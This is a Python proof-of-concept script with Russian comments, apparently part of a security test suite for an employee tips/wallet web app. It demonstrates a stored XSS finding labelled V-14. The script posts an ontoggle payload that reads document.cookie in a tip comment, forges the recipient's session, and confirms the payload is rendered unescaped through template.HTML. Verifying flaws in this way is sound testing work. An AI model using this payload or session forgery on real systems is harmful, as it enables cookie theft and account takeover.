# -*- coding: utf-8 -*-
"""V-14. Хранимая XSS в сообщении чаевых.

Комментарий чаевых чистится тем же однопроходным блэклистом, а в tips_view.html
выводится как TipHTML = template.HTML(memo) без экранирования. Отправитель
кладёт скрипт, получатель исполняет его при открытии чаевых.
"""
import re

from wallet_client import Client, parser, banner, ok, fail


def main():
    a = parser("Хранимая XSS в чаевых").parse_args()
    sender = Client(a.base)
    sender.login("ivanov", "workplace1")  # отправитель

    payload = '<details open ontoggle=alert(document.cookie)>pwn</details>'
    sender.post_form("/tips/new", {"recipient": "petrova", "amount_rub": "1", "comment": payload})

    victim = Client(a.base)
    victim.forge(2, "employee")  # petrova открывает входящие
    body = victim.get("/tips/received")[2].decode("utf-8", "replace")
    m = re.search(r"/tips/received\?id=(\d+)", body)
    if not m:
        fail("чаевые не доставлены")
    tip_id = m.group(1)
    view = victim.get(f"/tips/received?id={tip_id}")[2].decode("utf-8", "replace")
    if payload not in view:
        fail("нагрузка экранирована / не сохранилась")
    banner(f"в чаевых #{tip_id} хранится исполняемый: {payload}")
    ok("хранимая XSS в чаевых подтверждена")


if __name__ == "__main__":
    main()
